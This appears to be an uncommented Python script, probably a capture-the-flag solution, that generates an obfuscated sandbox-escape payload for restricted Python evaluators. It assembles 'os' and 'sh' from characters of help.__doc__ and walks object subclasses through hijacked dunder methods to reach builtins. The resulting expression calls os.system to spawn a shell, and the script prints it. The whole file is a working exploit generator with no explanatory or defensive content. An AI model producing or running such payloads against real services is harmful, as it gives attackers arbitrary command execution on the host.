BUILTINS = "[ x.__init__.__globals__ for x in [[-a for a.__class__.__neg__ in [[].__class__.__base__.__subclasses__]] for a in [help]][False][False] if WRAPPER_STRING not in [[-a for a.__class__.__neg__ in [x.__init__.__str__]] for a in [help]][False][False] and BUILTINS_STRING in x.__init__.__globals__ ][False][BUILTINS_STRING]"
OS = "[[[r[os_str] for r.__class__.__getitem__ in [BUILTINS.__import__]] for r in [help]][False][False] for os_str in [OS_STRING]][False]"
SYSTEM = "[[[g[sh_str] for g.__class__.__getitem__ in [OS.system]] for g in [help]][False][False] for sh_str in [SH_STRING]][False]"

OS_STRING = "help.__doc__[N52]+help.__doc__[N35]"
SH_STRING = "help.__doc__[N35]+help.__doc__[N8]"
BUILTINS_STRING = "help.__doc__[N11]+help.__doc__[N12]+help.__doc__[N13]+help.__doc__[N14]+help.__doc__[N15]+help.__doc__[N16]+help.__doc__[N17]+help.__doc__[N35]"
WRAPPER_STRING = "help.__doc__[N42]+help.__doc__[N43]+help.__doc__[N40]+help.__doc__[N23]+help.__doc__[N23]+help.__doc__[True]+help.__doc__[N43]"

N8 = "True--True--True--True--True--True--True--True"
N11 = "True--True--True--True--True--True--True--True--True--True--True"
N12 = "True--True--True--True--True--True--True--True--True--True--True--True"
N13 = "True--True--True--True--True--True--True--True--True--True--True--True--True"
N14 = "True--True--True--True--True--True--True--True--True--True--True--True--True--True"
N15 = "True--True--True--True--True--True--True--True--True--True--True--True--True--True--True"
N16 = "True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True"
N17 = "True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True"
N23 = "True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True"
N35 = "True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True"
N40 = "True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True"
N42 = "True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True"
N43 = "True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True"
N52 = "True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True--True"


ns = {"N8":N8, "N11":N11, "N12":N12, "N13":N13, "N14":N14, "N15":N15, "N16":N16, "N17":N17, "N23":N23, "N35":N35, "N40":N40, "N42":N42, "N43":N43, "N52":N52}

for n in ns:
    OS_STRING = OS_STRING.replace(n, ns[n])
    SH_STRING = SH_STRING.replace(n, ns[n])
    BUILTINS_STRING = BUILTINS_STRING.replace(n, ns[n])
    WRAPPER_STRING = WRAPPER_STRING.replace(n, ns[n])

strings = {"OS_STRING":OS_STRING, "SH_STRING":SH_STRING, "BUILTINS_STRING":BUILTINS_STRING, "WRAPPER_STRING":WRAPPER_STRING}

for s in strings:
    parts = strings[s].split("+")
    payload = parts[0]
    part_id = 0
    for part in parts[1:]:
        part_id += 1
        payload = f"[[{'z'*part_id}[{part}] for {'z'*part_id}.__class__.__getitem__ in [{payload}.__add__]] for {'z'*part_id} in [help]][False][False]"

    BUILTINS = BUILTINS.replace(s, payload)
    OS = OS.replace(s, payload)
    SYSTEM = SYSTEM.replace(s, payload)

OS = OS.replace("BUILTINS", BUILTINS)
SYSTEM = SYSTEM.replace("OS", OS)

print(SYSTEM)